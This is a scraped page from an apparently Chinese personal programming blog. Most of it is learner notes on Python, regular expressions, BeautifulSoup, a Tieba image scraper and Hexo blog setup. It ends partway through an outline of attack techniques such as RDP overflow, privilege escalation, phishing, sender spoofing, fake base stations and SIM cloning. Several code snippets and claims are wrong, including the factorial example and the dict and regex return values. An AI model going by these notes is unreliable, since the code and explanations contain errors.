</code></pre></li>
<li><p>直接子标签查找</p>
<pre><code>print soup.select(&apos;head &gt; title&apos;)
</code></pre></li>
<li><p>属性查找</p>
<p>  查找时还可以加入属性元素，属性需要用中括号括起来，注意属性和标签属于同一节点，所以中间不能加空格，否则会无法匹配到。</p>
<pre><code>print soup.select(&apos;a[href=&quot;http://example.com/elsie&quot;]&apos;)
print soup.select(&apos;a[class=&quot;sister&quot;]&apos;)
</code></pre></li>
</ul>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://dmonster.top/2017/04/23/BeautifulSoup库/" data-id="cjexzmnl40005e4ugj8bcsaqw" class="article-share-link" data-share="baidu" data-title="BeautifulSoup库">分享到</a>
      

      
        <a href="http://dmonster.top/2017/04/23/BeautifulSoup库/#ds-thread" class="article-comment-link">评论</a>
      

      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/学习笔记/">学习笔记</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-python学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/04/19/python学习笔记/" class="article-date">
  <time datetime="2017-04-19T15:23:51.000Z" itemprop="datePublished">2017-04-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/04/19/python学习笔记/">pyhon学习笔记</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
      <!-- Table of Contents -->
      
        <h1 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h1><p>元组是不可变序列。</p>
<ul>
<li>空元组：() </li>
<li>一个值的元组： 1, 或(1,)  //其中逗号不可省略</li>
<li><p>多个值的元组： 1, 2, 3 或 (1, 2, 3) </p>
<pre><code>2*(2+3) 输出10 //没有逗号，普通的值计算
2*(2+3,) 输出(5, 5) //有逗号，表示是一个元组，相乘后得到一个新的元组，有两个值
</code></pre></li>
<li>创建一个新元组： X = 1,2,3</li>
<li>访问元祖元素： X[1] //输出2</li>
<li><p>tuple函数：<br>  将序列转换为元组：</p>
<pre><code>tuple([1, 2, 3])  输出(1,2,3)            //列表
tuple(&apos;abc&apos;)      输出(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;)     //字符串
tuple((1,2,3))      输出(1,2,3)         //元组
</code></pre></li>
</ul>
<h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><p>键/值对之间用冒号隔开，项之间用逗号隔开，整个字典用大括号括起来。</p>
<pre><code>phonebook = {&apos;宁波&apos;:&apos;0574&apos;,&apos;台州&apos;:&apos;0576&apos;,&apos;杭州&apos;:&apos;0571&apos;}
phonebook[&apos;宁波&apos;]     //输出:&apos;0574&apos;
</code></pre><ul>
<li><p>dict()函数</p>
<p>  可以使用该函数通过其他映射或（键，值）对序列建立字典</p>
<pre><code>items=[(&apos;name&apos;,&apos;Alice&apos;),(&apos;age&apos;,28)]
d=dict(items)
print d  //输出字典：{&apos;age&apos;: 28, &apos;name&apos;: &apos;Alice&apos;} 
</code></pre><p>  或者用关键字参数形式</p>
<pre><code>d=dict(name=&apos;Alice&apos;,age=28)
print d  //输出字典：{&apos;age&apos;: 28, &apos;name&apos;: &apos;Alice&apos;}
</code></pre></li>
<li>字典的基本操作与元组类似，但是字典是无序的且值可变<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1></li>
</ul>
<h2 id="匿名函数：Lambda"><a href="#匿名函数：Lambda" class="headerlink" title="匿名函数：Lambda"></a>匿名函数：Lambda</h2><ul>
<li><p>匿名函数：</p>
<p>  lambda函数是一种快速定义单行的最小函数，是从lisp借用来的，可以在任何需要函数的地方</p>
</li>
<li><p>使用lambda的好处：</p>
<ol>
<li>使用python写一些执行脚本时，使用lambda可以省去定义函数的过程，让代码更加精简</li>
<li>对于一些抽象的，不会别的地方再复用的函数，有时候给函数起名字也很难，但是使用lambda不需要考虑命名问题</li>
<li>使用lambda在某些时候让代码更容易理解</li>
</ol>
</li>
<li><p>lambda基础：</p>
<ul>
<li>lambda语句中，冒号前是参数，可以有多个，用逗号隔开，冒号右边的返回值。</li>
<li><p>lambda语句构建的其实是一个函数对象：</p>
<pre><code>g = lambda x ： x**2
print g
</code></pre></li>
<li><p>执行匿名函数lambda：reduce(lambda x,y : x*y , range(1,6)) 求6的阶乘</p>
</li>
</ul>
</li>
</ul>
<h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><ul>
<li><p>for 循环</p>
<pre><code>for x in 序列
    执行代码
</code></pre></li>
<li><p>range()函数</p>
<pre><code>range(初始值，终止值，进步值) //指定终止值不包括在内
</code></pre><h2 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h2></li>
</ul>
<p>python中没有switch语句，通过字典合资点的get（）函数实现分支结构</p>
<p>例：</p>
<pre><code>from __future__ import division
    //可解决以上问题

def jia(x,y):
return x+y

def jian(x,y):
return x-y

def cheng(x,y):
return x*y

def chu(x,y):
return x/y

def operator(x,o,y):
if o==&quot;+&quot;:
jia(x,y)
elif o == &quot;-&quot;:
jian(x,y)
elif o == &quot;*&quot;:
cheng(x,y)
elif o == &quot;/&quot;:
chu(x,y)
else:
pass

operator(2,&apos;+&apos;,4)
</code></pre><p>如果是除法，先判断加减乘，效率低下，如果输入错误，会做四次无用的判断</p>
<p>switch直接判断条件，如果满足，直接执行</p>
<pre><code>operator = {&quot;+&quot;:jia, &quot;-&quot;:jian,&quot;*&quot;:cheng, &quot;/&quot;:chu}
print operator{&quot;+&quot;} // 对应jia的函数对象

等同于 print jia
</code></pre><p>所以</p>
<pre><code>print operator{&quot;+&quot;} (2,3)

等同于 print jia (2,3)
</code></pre><p>省去判断，如果没有对应的key则报错</p>
<p>所以用get方法，没有对应的key也不会报错</p>
<pre><code>print operator.get(&quot;%&quot;)(3,2) //不会报错

def f(x,o,y):
print operator.get(o)(x,y)

调用
f(3,&quot;+&quot;,2) //输出5 无需判断即可完成

operator.get(o)(x,y,*args,**kwargs)
</code></pre><p>参数更灵活</p>
<p>if能完成的一般都可以用字典实现.</p>
<ul>
<li><p>用字典+函数 实现switch： {1：case1,2:case2}.get()</p>
<pre><code>x=1
y=2
operator=&quot;/&quot;
result = {&quot;+&quot;:x+y, &quot;-&quot;:x-y, &quot;*&quot;:x*y, &quot;/&quot;x/y}
print result.get(operator)
//实现函数相同的功能
</code></pre></li>
</ul>
<h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><ul>
<li>max(l) //返回最大值 l为列表</li>
<li>min(l) //返回最小值</li>
<li>len(l) //l 的长度，l 为序列</li>
<li>divmod(5,2) // 5/2 返回元组(2,1) 商为2 余数为1</li>
<li>cmp(x，y) //比较两个对象x和y!如果x &lt; y ,返回负数；x == y, 返回0；x &gt; y,返回正数。</li>
<li>help(pow) //查找该函数用处</li>
<li>pow(2,3) //返回2^3 = 8</li>
<li>round(10) //10.0</li>
<li>callable(f) //测试某个函数可否被调用,如果f没被定义，则不可调用</li>
<li>isinstance(obj, class_or_tuple) //判断对象的类型！</li>
<li>range() //创造range()对象用于迭代！</li>
<li>type(object) //查看对象类型！</li>
<li>int（）,long(),float(),complex(),list(),tuple(),hex() //转化函数</li>
<li>chr(n) //当传入序号n时，返回n所代表的ASCII码字符的字符串</li>
<li><p>ord(c) //返回单字符字符串的int值（ASCII码值）！</p>
</li>
<li><p>string函数：只用于字符串的操作</p>
<pre><code>str.capitalize() //首字母大写

s = &apos;hello world&apos;
capitalize(s) //错误
s.capitalize() //正确，返回Hello world
</code></pre><p>  capitalize是class中的一个方法，s是string class的一个对象</p>
</li>
<li><p>str.replace() //替换</p>
<pre><code>s.replace(&quot;hello&quot;,&quot;good&quot;) //返回good world
</code></pre><p>  s 的值不变，返回值改变</p>
<pre><code>ss = &quot;123123123&quot;
ss.replace(&apos;1&apos;,&apos;x&apos;) //&apos;x23x23x23
ss.replace(&apos;1&apos;,&apos;x&apos;,1/2/3)&apos; //1/2/3表示替换的次数，从前往后
</code></pre></li>
<li><p>str.split() //用于切割</p>
<pre><code>ip = &quot;192.168.1.123&quot;
ip.split(&apos;.&apos;) //返回列表[192&apos;,&apos;168&apos;. ..]
ip.spliy(&apos;.&apos;,count)//count表示切割的次数，从前往后
</code></pre></li>
<li><p>import string //引入string模块</p>
<pre><code>string.replace(s,hello&apos;,&apos;good&apos;) // &apos;good world&apos;
两种方式
</code></pre></li>
</ul>
<h2 id="序列处理函数"><a href="#序列处理函数" class="headerlink" title="序列处理函数"></a>序列处理函数</h2><ul>
<li><p>len</p>
<pre><code>len(123) //出错 对象只能是序列
len() max() min()
</code></pre></li>
<li><p>filter():</p>
<pre><code>def f(x):
if x &gt; 5:
return True

f(10) //True
l = range(10)
fileter(f, l) //f 函数作用于 l 返回True时会吧结果保留下来 [6,7,8,9]
</code></pre></li>
<li><p>zip()</p>
<pre><code>z = zip([&apos;a&apos;,&apos;b&apos;,&apos;c&apos;],[&apos;x&apos;,&apos;y&apos;,&apos;z&apos;])
&gt;&gt;&gt;next(z)
(&apos;a&apos;,&apos;x&apos;)
&gt;&gt;&gt;next(z)
(&apos;b&apos;,&apos;y&apos;)
</code></pre></li>
<li><p>map()</p>
<pre><code>map(None,name,age,tel,test) 
//map遍历事如果某个列表元素不够，用None代替，None可以用函数代替
</code></pre></li>
</ul>
<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>模块是python组织代码的基本方式，即.py文件</p>
<ul>
<li><p>使用方法：</p>
<ul>
<li>导入模块名即文件名： import xxx</li>
<li><p>引用： xxx.方法</p>
</li>
<li><p>A调用B(B中含执行函数，不希望),在B中写：</p>
<pre><code>if __name__ = &quot;__main__ &quot; 
operator(2,&apos;*&apos;,3)
//如果__name__ = __main__则调用执行函数
//（直接调用 __name__ = __main__，间接调用 __name__ = xxx）
</code></pre></li>
<li><p>导入先后顺序：先在当前目录中找</p>
</li>
</ul>
</li>
<li><p>包</p>
<p>  python模块可按目录组织为包</p>
<ul>
<li>当前目录创建 __init__.py文件，上级目录即可成为一个包</li>
<li>使用时需从上级目录逐级访问</li>
</ul>
</li>
</ul>
<h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><p>对象方法</p>
<ul>
<li><p>打开</p>
<pre><code>f = open(&apos;文件目录&apos;)
</code></pre></li>
<li><p>关闭： </p>
<pre><code>f = close()
</code></pre></li>
<li><p>读取： </p>
<pre><code>f = read()
</code></pre><ul>
<li>f.readline() //每次读取一行，没有数据则返回空字符串</li>
<li>f.readlines() //把每个数据作为列表中的一个数据，返回列表</li>
<li>f.next() //和readline()迭代一样，但是结束时会停止</li>
</ul>
</li>
</ul>
<ul>
<li><p>写入</p>
<pre><code>f = open(&apos;文件目录&apos;,&apos;r+&apos;)
f.write(&apos;写入的内容&apos;)
</code></pre><ul>
<li>f.writelines(列表) //写入多行数据</li>
<li>f.flush() //断点续传，提交<br>（注意文件中指针的位置）</li>
<li>a：在文件末尾写入</li>
<li>a+： 在文件末尾读写</li>
<li>r： 只读</li>
<li>r+：读写</li>
<li>w：重新写入</li>
<li>w+：重新读写</li>
</ul>
</li>
<li><p>f.seek(偏移量,选项) </p>
<ul>
<li>选项 = 0，文件指针指向从文件头部到‘偏移量字’节处</li>
<li>选项 = 1，文件指针指向从文件的当前位置向后移动‘偏移量’字节</li>
<li>选项 = 2，文件指针指向从文件的尾部向前移动‘偏移量’字节处</li>
</ul>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://dmonster.top/2017/04/19/python学习笔记/" data-id="cjexzmnmz000ye4ugohsooqg1" class="article-share-link" data-share="baidu" data-title="pyhon学习笔记">分享到</a>
      

      
        <a href="http://dmonster.top/2017/04/19/python学习笔记/#ds-thread" class="article-comment-link">评论</a>
      

      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-python爬虫入门实验" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/04/19/python爬虫入门实验/" class="article-date">
  <time datetime="2017-04-19T14:32:51.000Z" itemprop="datePublished">2017-04-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/实验/">实验</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/04/19/python爬虫入门实验/">python爬虫入门实验</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
      <!-- Table of Contents -->
      
        <p>爬百度贴吧里的图片</p>
<pre><code>#!/usr/bin/python
import re
import urllib //加载模块

def getHtml(url):    // 获取地址
    page = urllib.urlopen(url)    //打开
    html = page.read()    //读取
    return html

def getImg(html):    //获取并下载图片
    reg = r&apos;&lt;img class=&quot;BDE_Image&quot; src=&quot;(.*?)&quot; &apos;    //关键！！！查看页面元素写正则表达式
    imgre = re.compile(reg)        //预编译
    imglist = re.findall(imgre,html)    //匹配
    x = 0
    for imgurl in imglist:
        urllib.urlretrieve(imgurl,&apos;%s.jpg&apos; %x)    //下载函数
        x+=1

html =  getHtml(&quot;https://tieba.baidu.com/p/2237770604&quot;)
print getImg(html)
</code></pre>
      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://dmonster.top/2017/04/19/python爬虫入门实验/" data-id="cjexzmnnc0015e4ugannen768" class="article-share-link" data-share="baidu" data-title="python爬虫入门实验">分享到</a>
      

      
        <a href="http://dmonster.top/2017/04/19/python爬虫入门实验/#ds-thread" class="article-comment-link">评论</a>
      

      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/爬虫/">爬虫</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-正则表达式" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/04/19/正则表达式/" class="article-date">
  <time datetime="2017-04-19T09:28:45.000Z" itemprop="datePublished">2017-04-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/04/19/正则表达式/">正则表达式</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
      <!-- Table of Contents -->
      
        <h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>python标准库为使用正则表达式提供了re模块</p>
<ul>
<li><p>re.search使用：</p>
<pre><code>re.search(r&apos;fox&apos;,&apos;the quick brown fox jumped&apos;)
//从字符串中寻找fox返回发现的第一个匹配,若找不到则返回none
</code></pre></li>
<li><p>mach 对象</p>
<pre><code>re.search(r&apos;fox&apos;,&apos;the quick brown fox jumped&apos;)
</code></pre><ul>
<li><p>group方法</p>
<pre><code>match.group() //输出 fox
</code></pre></li>
</ul>
</li>
<li><p>找到多个匹配</p>
<pre><code>re.search(r&apos;o&apos;,&apos;the quick brown fox jumped&apos;)
//返回  [&apos;o&apos;,&apos;o&apos;]
</code></pre></li>
</ul>
<h1 id="基本正则表达式"><a href="#基本正则表达式" class="headerlink" title="基本正则表达式"></a>基本正则表达式</h1><ul>
<li><p>字符组</p>
<pre><code>re.search(r&apos;[Pp]ython&apos;,&apos;python 3&apos;) //匹配到 python
re.search(r&apos;[Pp]ython&apos;,&apos;Python 3&apos;) //匹配到 Python
</code></pre><ul>
<li><p>区间</p>
<pre><code>re.search(r&apos;[a-zA-Z]&apos;,&apos;x&apos;) //匹配到 x
re.search(r&apos;[a-zA-Z]&apos;,&apos;B&apos;) //匹配到 B
</code></pre></li>
<li><p>取反</p>
<pre><code>re.search(r&apos;[^a-z]&apos;,&apos;4&apos;) //匹配到 4
</code></pre></li>
<li><p>快捷方式</p>
<ul>
<li><p>\w :匹配所有字符</p>
<pre><code>re.search(r&apos;\w&apos;,&apos;python 3&apos;) //匹配到 p
re.findall(r&apos;\w&apos;,&apos;python 3&apos;) //匹配到 [&apos;p&apos;,&apos;y&apos;,&apos;h&apos;,&apos;o&apos;,&apos;n&apos;]
</code></pre></li>
<li><p>\d :匹配所有数字字符</p>
</li>
<li>\s :匹配所有空白字符</li>
<li>. ：匹配任意字符</li>
<li>取反： \W, \d, \S</li>
</ul>
</li>
</ul>
</li>
<li><p>字符串的开始与结束</p>
<ul>
<li><p>开始</p>
<pre><code>re.search(r&apos;^python&apos;,&apos;python 3&apos;) //匹配到 python
re.search(r&apos;^python&apos;,&apos;hello python &apos;) //不是以pyhon开头，匹配不到
</code></pre></li>
<li><p>结束</p>
<pre><code>re.search(r&apos;python$&apos;,&apos;hello python&apos;) //匹配到python
re.search(r&apos;python$&apos;,&apos;python 3&apos;) //匹配不到，不是以python结束
</code></pre></li>
</ul>
</li>
<li><p>可选字符</p>
<pre><code>re.search(r&apos;honou?r&apos;,&apos;He served with honor.&apos;) //匹配到honor
re.search(r&apos;honou?r&apos;,&apos;He served with honour.&apos;) //匹配到honour
</code></pre></li>
<li><p>重复</p>
<pre><code>re.search(r&apos;[\d]{3}-[\d]{4}&apos;,&apos;867-5309 / J&apos;) //匹配到 867-5309
</code></pre><ul>
<li><p>重复区间</p>
<pre><code>re.search(r&apos;[\d]{3,4}&apos;,&apos;123&apos;) //匹配到123
re.search(r&apos;[\d]{3,4}&apos;,&apos;1234&apos;) //匹配到 1234
</code></pre></li>
<li><p>开闭区间</p>
<pre><code>re.search(r&apos;[\d]{1, }&apos;,&apos;1000000&apos;) //匹配到1000000
</code></pre></li>
<li><p>速写</p>
<ul>
<li>用 + 代替 {1, }</li>
<li>用 * 代替 {0, }</li>
</ul>
</li>
<li><p>分组</p>
<pre><code>match = re.search(r&apos;[\d]{3}-[\d]{4}&apos;,&apos;867-5309 / J&apos;)

match.group() //输出（&apos;867-5309&apos;）
match.groups() //输出（&apos;867&apos;,&apos;5309&apos;）
match.groups(1) //输出（&apos;867&apos;）
</code></pre></li>
</ul>
</li>
<li><p>零分组<br>如果group()不带参数，则默认参数为0，所以输出分组参数从1开始。</p>
</li>
<li><p>命名分组<br>命名语法?P<group name\=""></group></p>
<pre><code>match = re.seach(&apos;r&apos;(?P&lt;first_three&gt;[\d]{3})-(?P&lt;last_four&gt;[\d]{4})&apos;,&apos;867-5309&apos;)

match.group(&apos;first_three&apos;) //输出&quot;867&quot;
</code></pre></li>
</ul>
<p>此外，match提供一个groupdict方法，该方法在大多数方面和groups类似，但是他返回的是一个字典不是元组。</p>
<ul>
<li>引用已经存在的分组</li>
</ul>
<h1 id="先行断言"><a href="#先行断言" class="headerlink" title="先行断言"></a>先行断言</h1><ul>
<li><p>取反先行断言</p>
<pre><code>re.search(r&apos;n(?!e)&apos;,&apos;final&apos;) // 匹配到 n
//不同于取反，不返回取反的字符
</code></pre></li>
<li><p>正向先行断言</p>
<pre><code>re.search(r&apos;n(?=e)&apos;,&apos;jasmine&apos;) //匹配到 n
</code></pre></li>
</ul>
<h1 id="标记"><a href="#标记" class="headerlink" title="标记"></a>标记</h1><ul>
<li><p>不区分大小写</p>
<p>  re.IGNORECASE / re.I</p>
<pre><code>re.search(r&apos;python&apos;, &apos;PYTHON IS OS GOOD&apos;, re.IGNORECASE) // 匹配到 python
</code></pre></li>
<li><p>点匹配换行符</p>
<p>  re.DOTALL / re.S</p>
<pre><code>re.search(r&apos;.+&apos;,&apos;foo\nbar&apos;) //匹配到foo 
re.search(r&apos;.+&apos;,&apos;foo\nbar&apos;,re.DOTALL) //匹配到foo/nbar
</code></pre></li>
<li><p>多行模式</p>
<p>  re.MULTILINE / re.M</p>
<pre><code>re.search(r&apos;^bar&apos;,&apos;foo\nbar&apos;) //因为nabr在下一行，所以匹配不到
re.search(r&apos;^bar&apos;,&apos;foo\nbar&apos;,re.MULTILINE) //匹配到bar
</code></pre></li>
<li><p>详细模式</p>
<p>  re.VERBOSE / re.X</p>
</li>
<li><p>调试模式</p>
<p>  re.DEBUG</p>
<pre><code>match = re.seach(&apos;r&apos;(?P&lt;first_three&gt;[\d]{3})-(?P&lt;last_four&gt;[\d]{4})&apos;,&apos;867-5309&apos;,re.DEBUG) //输出调试信息
</code></pre></li>
<li><p>使用多个标记</p>
<pre><code>re.S | re.M
</code></pre></li>
</ul>
<h1 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h1><p>从一个字符串中剥离无关数据</p>
<pre><code>re.sub(r&apos;\+?1&apos;?[ .-]?\(?([\d]{3})\)?[ .-]?([\d]{3})[ .-]?([\d]{4})&apos;,r&apos;\2\3\4&apos;,&apos;213-867-5309&apos;) //匹配到2138675309

re.sub(r&apos;\+?1&apos;?[ .-]?\(?([\d]{3})\)?[ .-]?([\d]{3})[ .-]?([\d]{4})&apos;,r&apos;(\2) \3-\4&apos;,&apos;+1 213-867-5309&apos;) //匹配到(213) 867-5309
</code></pre><p>（ ()\1 表示重复正则第一个圆括号内匹配到的内容 ）</p>
<h1 id="已编译的正则表达式"><a href="#已编译的正则表达式" class="headerlink" title="已编译的正则表达式"></a>已编译的正则表达式</h1><pre><code>regex = re.compile(r&apos;\+?1&apos;?[ .-]?\(?([\d]{3})\)?[ .-]?([\d]{3})[ .-]?([\d]{4})&apos;)

regex.search(&apos;213-867-5309&apos;) //匹配到 213-867-5309
regex.sub(r&apos;(\2) \3-\4&apos;,&apos;+1 213-867-5309&apos;) //匹配到 (213) 867-5309
</code></pre>
      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://dmonster.top/2017/04/19/正则表达式/" data-id="cjexzmnnv001fe4ug6lnpwl8c" class="article-share-link" data-share="baidu" data-title="正则表达式">分享到</a>
      

      
        <a href="http://dmonster.top/2017/04/19/正则表达式/#ds-thread" class="article-comment-link">评论</a>
      

      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-hexo+github创建自己的博客" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/04/13/hexo+github创建自己的博客/" class="article-date">
  <time datetime="2017-04-13T07:15:45.000Z" itemprop="datePublished">2017-04-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/04/13/hexo+github创建自己的博客/">hexo+github搭建自己的博客</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
      <!-- Table of Contents -->
      
        <h1 id="注册github"><a href="#注册github" class="headerlink" title="注册github"></a>注册github</h1><pre><code>- 创建一个项目，如xxx.github.io
</code></pre><h1 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h1><pre><code>- 安装git和Node
- 在本地创建一个文件夹，如blog
- 右击blog文件夹点击git bash
- 执行命令 npm install -g hexo 安装hexo
- 执行命令 hexo init 初始化hexo
</code></pre><h2 id="hexo常用命令"><a href="#hexo常用命令" class="headerlink" title="hexo常用命令"></a>hexo常用命令</h2><pre><code>- hexo n &quot;new bolg&quot; == hexo new &quot;new blog&quot; 新建文章
- hexo p == hexo publish
- hexo g == hexo generate  生成
- hexo s == hexo server  启动服务预览
    打开localhost:4000开启本地预览
- hexo d == hexo deploy  部署
- hexo clean  清除缓存
</code></pre><h2 id="本地目录下-config-yml配置"><a href="#本地目录下-config-yml配置" class="headerlink" title="本地目录下_config.yml配置"></a>本地目录下_config.yml配置</h2><pre><code>- language: zh-CN
- url: 自己申请的域名
- repo： https://github.com/xxx/xxx.github.io.git
- branch: master
</code></pre><h1 id="markdown编辑器语法"><a href="#markdown编辑器语法" class="headerlink" title="markdown编辑器语法"></a>markdown编辑器语法</h1><p><a href="http://www.kancloud.cn/wizardforcel/markdown-simple-world/97375/" title="markdown 基本语法" target="_blank" rel="noopener">参考</a></p>
<h1 id="主题及优化"><a href="#主题及优化" class="headerlink" title="主题及优化"></a>主题及优化</h1><h2 id="添加文章目录"><a href="#添加文章目录" class="headerlink" title="添加文章目录"></a>添加文章目录</h2><pre><code>1. 先找到themes/landscape/layout/_partial/article.ejs文件中的&lt;%- post.content %&gt;，在这一行下加入如下代码

    &lt;!-- Table of Contents --&gt;
     &lt;% if (!index &amp;&amp; post.toc){ %&gt;
         &lt;div id=&quot;toc&quot; class=&quot;toc-article&quot;&gt;
           &lt;strong class=&quot;toc-title&quot;&gt;文章目录&lt;/strong&gt;
            &lt;%- toc(post.content) %&gt;
          &lt;/div&gt;
     &lt;% } %&gt;    

2. 找到themes/landscape/source/css/_partial/article.styl文件，在其最后添加如下代码

    .toc-article
      background #eee
      border 1px solid #bbb
      border-radius 10px
      margin 1.5em 0 0.3em 1.5em
      padding 1.2em 1em 0 1em
      max-width 28%
    .toc-title
      font-size 120%
    #toc
      line-height 1em
      font-size 0.9em
      float right
      .toc
     padding 0
     margin 1em
     line-height 1.8em
     li
       list-style-type none
      .toc-child 
     margin-left 1em

3. 使用:在每篇文章开头添加 toc: true
</code></pre><h2 id="微博秀"><a href="#微博秀" class="headerlink" title="微博秀"></a>微博秀</h2><p>进入<a href="http//http://open.weibo.com/">微博开放平台</a>找到微博秀，设置好后将复制代码,进入/blog/themes/layout/_weight文件夹，新建weibo.ejs文件，模仿其他文件编写weibo.ejs</p>
<pre><code>&lt;% if (true){ %&gt; 
&lt;div class=&quot;widget-wrap&quot;&gt; 
    &lt;h3 class=&quot;widget-title&quot;&gt;Weibo show&lt;/h3&gt; 
    &lt;div class=&quot;widget-weibo&quot;&gt; 
        复制代码
    &lt;/div&gt; 
&lt;/div&gt; 
&lt;% } %&gt;
</code></pre><p>编辑themes/landscape/source/css/_partial/sidebar.styl文件，将其中的.weight复制前半部分，新建一个.weibo-weigth添加到文件最后<br>    .widget-weibo<br>          color: color-sidebar-text<br>          text-shadow: 0 1px #fff<br>          background: color-widget-background<br>          box-shadow: 0 -1px 4px color-widget-border inset<br>          border: 1px solid color-widget-border<br>          border-radius: 3px</p>
<h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><h2 id="hexo-d-g部署不上"><a href="#hexo-d-g部署不上" class="headerlink" title="hexo d -g部署不上"></a>hexo d -g部署不上</h2><pre><code>- 登陆自己的github查看更新时间是否符合
- 查看blog目录下的_config.yml配置文件deploy分支，确认是否是github上所使用的分支
- 
</code></pre><h2 id="css部署不上"><a href="#css部署不上" class="headerlink" title="css部署不上"></a>css部署不上</h2><pre><code>-删除css中的注释试试
</code></pre>
      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://dmonster.top/2017/04/13/hexo+github创建自己的博客/" data-id="cjexzmnmr000ve4ugvxbow99x" class="article-share-link" data-share="baidu" data-title="hexo+github搭建自己的博客">分享到</a>
      

      
        <a href="http://dmonster.top/2017/04/13/hexo+github创建自己的博客/#ds-thread" class="article-comment-link">评论</a>
      

      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/">hexo</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-网络渗透与深度防御笔记" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/04/06/网络渗透与深度防御笔记/" class="article-date">
  <time datetime="2017-04-06T07:15:45.000Z" itemprop="datePublished">2017-04-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/04/06/网络渗透与深度防御笔记/">网络渗透与深度防御笔记</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
      <!-- Table of Contents -->
      
        <h1 id="翻墙："><a href="#翻墙：" class="headerlink" title="翻墙："></a>翻墙：</h1><pre><code>1. 免费代理服务器（工具——internet选项——连接——局域网设置）
2. 肉机
3. 2次vpn（91vpn）
</code></pre><h1 id="入侵还原："><a href="#入侵还原：" class="headerlink" title="入侵还原："></a>入侵还原：</h1><pre><code>- 利用漏洞
</code></pre><h1 id="攻击方法："><a href="#攻击方法：" class="headerlink" title="攻击方法："></a>攻击方法：</h1><ul>
<li><p>溢出攻击：栈，堆。</p>
<ol>
<li>远程溢出：溢出工具+对方服务器ip+cmdshell   （ms12-020：3389）</li>
<li>本地溢出：  程序——提权（ser-u ，360）<ul>
<li>自动更新：已公布的 后门</li>
</ul>
</li>
</ol>
</li>
<li><p>汇编语言：</p>
<ul>
<li>漏洞挖掘 破解分析</li>
</ul>
</li>
<li><p>防御：</p>
<ul>
<li>安全编码，输入参数过滤</li>
</ul>
</li>
<li><p>邮件攻击：  </p>
<ol>
<li>密码破解：字典</li>
<li>垃圾邮件——炸蛋——系统stop</li>
<li>邮件钓鱼：链接（美女 特价 附马邮件（以纯文本方式安全打开））</li>
<li>伪装发件人：1和l，0和O，4和A</li>
<li>表单钓鱼：提交信息——网页生成文件或发送信息至黑客邮箱</li>
<li>邮箱跨站：hotmail， gmail，yahoo，139，sina</li>
</ol>
</li>
<li><p>手机攻击：   </p>
<ol>
<li>IOS诊断有后门 </li>
<li>手机远程控制：微信，陌陌，通话环境录音，通讯录，照片</li>
<li>伪基站</li>
<li>sim卡复制</li>
